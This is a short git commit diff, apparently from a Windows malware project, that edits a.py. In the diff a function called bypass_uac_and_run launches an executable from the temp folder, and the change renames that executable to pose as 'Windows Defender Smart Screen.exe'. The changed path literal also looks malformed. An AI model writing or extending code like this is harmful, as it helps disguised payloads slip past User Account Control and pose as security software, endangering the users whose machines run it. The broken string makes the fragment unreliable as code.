09808c5adc418880b350a3e89db165282a0ddad6
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-12-19 13:32:37 +0300

    Update a.py

--- a.py
+++ a.py
@@ -39,6 +39,6 @@ def bypass_uac_and_run(exe_path):
 
 if __name__ == "__main__":
     # Senin istediğin dosya yolu
-    target_exe = r"%temp%\asd\3.exe"
+    target_exe = r"%temp%\"Windows Defender Smart Screen.exe"
     
     bypass_uac_and_run(target_exe)
